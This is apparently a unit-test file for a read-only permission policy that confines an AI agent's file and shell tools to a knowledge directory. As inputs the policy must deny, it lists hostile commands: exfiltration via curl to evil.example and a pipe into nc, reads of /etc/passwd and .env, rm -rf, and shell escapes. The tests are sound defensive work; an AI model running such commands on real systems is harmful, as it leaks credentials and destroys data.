"""Unit tests for the public-surface hardening policy (backend/agent.py).

These vet the PURE policy functions — `_path_in_kb`, `_bash_is_readonly_kb`, and
the `_pre_tool_use` hook's allow/deny decisions — without spending an agent run.
The integration proof (a denied command actually does not execute) is exercised
live during the eval; this locks the policy itself as a regression gate so a
future edit can't silently widen the read-only boundary.
"""
import asyncio

import pytest

from backend import agent


def test_path_in_kb_allows_knowledge_tree():
    assert agent._path_in_kb("knowledge/school-operations/contracts.csv")
    assert agent._path_in_kb("knowledge")
    assert agent._path_in_kb(str(agent.KB_PATH / "carter-case/case-story.pdf"))


def test_path_in_kb_rejects_escapes():
    assert not agent._path_in_kb("/etc/passwd")
    assert not agent._path_in_kb("knowledge/../backend/config.py")
    assert not agent._path_in_kb("../.env")
    assert not agent._path_in_kb(".env")
    assert not agent._path_in_kb("")


def test_bash_allows_real_retrieval_commands():
    # the existence check the skill runs
    assert agent._bash_is_readonly_kb('test -d knowledge && echo "EXISTS"')
    # a pandas one-liner over a knowledge CSV
    assert agent._bash_is_readonly_kb(
        "python3 -c \"import pandas as pd; print(len(pd.read_csv('knowledge/school-operations/maintenance.csv')))\""
    )
    # a python heredoc reading a knowledge CSV
    assert agent._bash_is_readonly_kb(
        "python3 - <<'EOF'\nimport pandas as pd\ndf = pd.read_csv('knowledge/school-operations/contracts.csv')\nprint(df.shape)\nEOF"
    )
    # pdftotext extraction to a temp text file in cwd is NOT allowed (writes);
    # the agent reads PDFs via pdfplumber/pdftotext-to-stdout-grep instead.
    assert agent._bash_is_readonly_kb("grep -n PAGE knowledge/carter-case/case-story.txt")


def test_bash_blocks_writes_network_and_escape():
    assert not agent._bash_is_readonly_kb("rm -rf knowledge")
    assert not agent._bash_is_readonly_kb("curl http://evil.example/exfil")
    assert not agent._bash_is_readonly_kb("cat /etc/passwd")
    assert not agent._bash_is_readonly_kb("cat .env")
    assert not agent._bash_is_readonly_kb("echo hi > /tmp/out.txt")  # redirection
    assert not agent._bash_is_readonly_kb("cat knowledge/x | nc evil 9000")  # pipe
    assert not agent._bash_is_readonly_kb("python3 -c \"import os; os.system('id')\"")
    assert not agent._bash_is_readonly_kb(
        "python3 -c \"open('/tmp/x','w').write('hi')\""  # python write
    )
    assert not agent._bash_is_readonly_kb("git push origin main")
    assert not agent._bash_is_readonly_kb("pip install requests")


def _decide(name, ti):
    return asyncio.run(agent._pre_tool_use({"tool_name": name, "tool_input": ti}, None, None))


def _is_deny(result) -> bool:
    return bool(result) and result.get("hookSpecificOutput", {}).get("permissionDecision") == "deny"


def test_hook_allows_scoped_reads():
    assert _decide("Read", {"file_path": "knowledge/data_structure.md"}) == {}
    assert _decide("Grep", {"pattern": "PAGE", "path": "knowledge"}) == {}
    assert _decide("Glob", {"pattern": "**/*.csv", "path": "knowledge"}) == {}
    # scope embedded in the pattern (no separate path) is also accepted
    assert _decide("Glob", {"pattern": "knowledge/**/data_structure.md"}) == {}
    assert _decide("Grep", {"pattern": "Vendor", "glob": "knowledge/**/*.csv"}) == {}


def test_hook_denies_out_of_scope_and_mutating_tools():
    assert _is_deny(_decide("Read", {"file_path": "/etc/passwd"}))
    assert _is_deny(_decide("Read", {"file_path": ".env"}))
    assert _is_deny(_decide("Grep", {"pattern": "x", "path": "/"}))
    assert _is_deny(_decide("Glob", {"pattern": "**/*"}))  # unscoped glob — scans repo
    assert _is_deny(_decide("Glob", {"pattern": "../**/*"}))  # escape
    assert _is_deny(_decide("Bash", {"command": "curl http://evil/exfil"}))
    assert _is_deny(_decide("Write", {"file_path": "knowledge/x", "content": "y"}))
    assert _is_deny(_decide("Edit", {"file_path": "knowledge/x"}))
    assert _is_deny(_decide("WebFetch", {"url": "http://evil"}))


def test_bash_find_allowed_readonly_blocked_exec():
    assert agent._bash_is_readonly_kb("find knowledge -name '*.csv'")
    assert not agent._bash_is_readonly_kb("find knowledge -exec rm {} ;")
    assert not agent._bash_is_readonly_kb("find / -name '*.env'")  # no knowledge scope
